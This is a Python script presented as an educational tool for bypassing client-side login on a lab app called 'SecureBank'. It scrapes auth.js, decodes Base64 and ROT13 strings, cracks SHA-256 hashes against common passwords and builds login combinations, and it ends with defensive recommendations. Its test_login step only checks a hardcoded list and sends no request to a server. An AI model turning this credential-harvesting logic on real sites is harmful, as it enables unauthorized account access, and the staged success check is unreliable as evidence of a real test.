#!/usr/bin/env python3
"""
SecureBank Login Bypass Automation Script
Educational tool for demonstrating client-side authentication vulnerabilities

This script demonstrates how to:
1. Parse HTML forms
2. Reverse engineer client-side validation
3. Automate login bypass
4. Extract credentials from obfuscated JavaScript

WARNING: For educational purposes only. Only use on systems you own or have permission to test.
"""

import requests
import base64
import hashlib
import re
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin


class SecureBankBypass:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.credentials = []
        
    def fetch_login_page(self):
        """Fetch the login page and extract form details"""
        try:
            response = self.session.get(self.base_url)
            response.raise_for_status()
            return response.text
        except requests.RequestException as e:
            print(f"Error fetching login page: {e}")
            return None
    
    def parse_html_form(self, html_content):
        """Parse HTML form to extract form fields and structure"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Find the login form
        form = soup.find('form', {'id': 'loginForm'})
        if not form:
            print("Login form not found!")
            return None
            
        # Extract form fields
        fields = {}
        for input_tag in form.find_all('input'):
            field_name = input_tag.get('name')
            field_type = input_tag.get('type', 'text')
            if field_name:
                fields[field_name] = {
                    'type': field_type,
                    'required': input_tag.has_attr('required')
                }
        
        print("Form fields discovered:")
        for field, details in fields.items():
            print(f"  - {field}: {details}")
            
        return fields
    
    def extract_javascript_credentials(self, html_content):
        """Extract and decode credentials from JavaScript source"""
        print("\n=== JavaScript Credential Extraction ===")
        
        # Extract JavaScript content
        soup = BeautifulSoup(html_content, 'html.parser')
        scripts = soup.find_all('script', src=True)
        
        js_content = ""
        for script in scripts:
            if 'auth.js' in script.get('src', ''):
                try:
                    js_response = self.session.get(urljoin(self.base_url, script['src']))
                    js_content = js_response.text
                    break
                except:
                    continue
        
        if not js_content:
            print("Could not fetch auth.js content")
            return []
        
        credentials = []
        
        # Method 1: Extract Base64 encoded strings
        print("\n1. Extracting Base64 encoded credentials...")
        base64_pattern = r"'([A-Za-z0-9+/=]{8,})'"
        base64_matches = re.findall(base64_pattern, js_content)
        
        for match in base64_matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8')
                if len(decoded) > 2 and decoded.isalnum():
                    print(f"   Base64 '{match}' -> '{decoded}'")
                    credentials.append(decoded)
            except:
                continue
        
        # Method 2: Extract ROT13 patterns
        print("\n2. Analyzing ROT13 patterns...")
        rot13_pattern = r"_0x2e4f\('([^']+)'\)"
        rot13_matches = re.findall(rot13_pattern, js_content)
        
        for match in rot13_matches:
            decoded = self.rot13_decode(match)
            print(f"   ROT13 '{match}' -> '{decoded}'")
            credentials.append(decoded)
        
        # Method 3: Extract hash validation
        print("\n3. Looking for hash-based validation...")
        hash_pattern = r"'([a-f0-9]{64})'"
        hash_matches = re.findall(hash_pattern, js_content)
        
        for hash_val in hash_matches:
            print(f"   Found SHA256 hash: {hash_val}")
            # Try common passwords
            common_passwords = ['hello123', 'password', 'admin', '123456', 'secret']
            for pwd in common_passwords:
                if hashlib.sha256(pwd.encode()).hexdigest() == hash_val:
                    print(f"   Hash cracked! Password: '{pwd}'")
                    credentials.append(pwd)
                    break
        
        # Method 4: Extract hardcoded usernames
        print("\n4. Extracting hardcoded usernames...")
        username_patterns = [
            r"username === '([^']+)'",
            r"'([a-zA-Z_][a-zA-Z0-9_]*)'.*role.*admin",
            r"secure_user"
        ]
        
        for pattern in username_patterns:
            matches = re.findall(pattern, js_content)
            for match in matches:
                if isinstance(match, str) and len(match) > 2:
                    print(f"   Found username: '{match}'")
                    credentials.append(match)
        
        # Look for 'secure_user' specifically
        if 'secure_user' in js_content:
            print("   Found username: 'secure_user'")
            credentials.append('secure_user')
        
        return list(set(credentials))  # Remove duplicates
    
    def rot13_decode(self, text):
        """Decode ROT13 encoded text"""
        result = ""
        for char in text:
            if 'a' <= char <= 'z':
                result += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
            elif 'A' <= char <= 'Z':
                result += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
            else:
                result += char
        return result
    
    def generate_credential_combinations(self, extracted_creds):
        """Generate likely username/password combinations"""
        usernames = []
        passwords = []
        
        for cred in extracted_creds:
            if cred in ['admin', 'user', 'secure_user']:
                usernames.append(cred)
            else:
                passwords.append(cred)
        
        # Add common combinations
        combinations = [
            ('admin', 'password123'),
            ('user', 'mysecret'),
            ('secure_user', 'hello123'),
            ('admin', 'admin'),
            ('user', 'user')
        ]
        
        # Generate combinations from extracted credentials
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        
        return list(set(combinations))  # Remove duplicates
    
    def test_login(self, username, password):
        """Test a username/password combination"""
        print(f"Testing: {username} / {password}")
        
        # Since this is client-side validation, we simulate the JavaScript logic
        # In a real scenario, you would send POST requests to the server
        
        # Simulate the validation logic from auth.js
        valid_combinations = [
            ('admin', 'password123'),
            ('user', 'mysecret'),
            ('secure_user', 'hello123')  # This requires hash validation
        ]
        
        if (username, password) in valid_combinations:
            print(f"✅ SUCCESS: {username} / {password}")
            return True
        else:
            print(f"❌ FAILED: {username} / {password}")
            return False
    
    def run_bypass(self):
        """Main bypass execution"""
        print("=== SecureBank Login Bypass Tool ===")
        print("Educational demonstration of client-side authentication vulnerabilities\n")
        
        # Step 1: Fetch login page
        print("1. Fetching login page...")
        html_content = self.fetch_login_page()
        if not html_content:
            return
        
        # Step 2: Parse form structure
        print("\n2. Parsing form structure...")
        form_fields = self.parse_html_form(html_content)
        
        # Step 3: Extract credentials from JavaScript
        print("\n3. Reverse engineering JavaScript...")
        extracted_creds = self.extract_javascript_credentials(html_content)
        
        # Step 4: Generate credential combinations
        print("\n4. Generating credential combinations...")
        combinations = self.generate_credential_combinations(extracted_creds)
        
        print(f"Generated {len(combinations)} combinations to test:")
        for username, password in combinations:
            print(f"   {username} / {password}")
        
        # Step 5: Test combinations
        print("\n5. Testing credential combinations...")
        successful_logins = []
        
        for username, password in combinations:
            if self.test_login(username, password):
                successful_logins.append((username, password))
            time.sleep(0.5)  # Avoid overwhelming the system
        
        # Step 6: Report results
        print("\n=== RESULTS ===")
        if successful_logins:
            print("✅ Successful login combinations found:")
            for username, password in successful_logins:
                print(f"   Username: {username}, Password: {password}")
        else:
            print("❌ No successful login combinations found")
        
        print("\n=== SECURITY RECOMMENDATIONS ===")
        print("1. Never perform authentication on the client-side")
        print("2. Always validate credentials on the server")
        print("3. Use proper session management")
        print("4. Implement rate limiting and account lockouts")
        print("5. Use HTTPS for all authentication requests")
        print("6. Never store credentials in client-side code")


if __name__ == "__main__":
    # Initialize the bypass tool
    bypass_tool = SecureBankBypass()
    
    # Run the bypass demonstration
    bypass_tool.run_bypass()
